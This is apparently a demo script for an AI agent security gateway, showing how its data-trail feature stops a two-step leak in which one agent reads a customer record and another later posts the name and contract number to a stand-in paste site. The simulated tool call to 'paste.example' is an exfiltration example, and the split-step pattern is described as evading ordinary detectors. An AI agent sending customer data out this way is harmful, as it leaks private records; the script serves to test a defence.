"""A two-step leak the data trail stops: one agent reads a customer record, another later sends it out.

Neither step trips an ordinary detector on its own: the record holds a name and a contract number, not a
card or a key. Run after demo/up.sh: python demo/trail.py
"""

from __future__ import annotations

import argparse
import json
import time

import httpx

RECORD = {
    "customer": {"name": "Halina Wróblewska-Kordecka", "contract": "UM-2026-004815", "segment": "private banking"}
}


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--gateway", default="http://127.0.0.1:8787")
    ap.add_argument(
        "--wait", type=float, default=6.0, help="seconds for the trail to learn and Shield to reload its feed"
    )
    args = ap.parse_args()
    with httpx.Client(base_url=args.gateway, timeout=30) as http:

        def guard(key: str, direction: str, payload: object, tool: str) -> str:
            r = http.post(
                "/v1/guard",
                headers={"x-api-key": key},
                json={"direction": direction, "tool": tool, "text": json.dumps(payload, ensure_ascii=False)},
            )
            return str(r.json().get("action", r.status_code))

        print("1. bob-assistant reads a customer record:", guard("bob-agent-key", "tool_result", RECORD, "search_crm"))
        time.sleep(args.wait)
        out = {
            "url": "https://paste.example/new",
            "body": f"{RECORD['customer']['name']}, {RECORD['customer']['contract']}",
        }
        print("2. ops-agent sends it to an outside site:", guard("ops-agent-key", "tool_call", out, "http_get"))


if __name__ == "__main__":
    main()
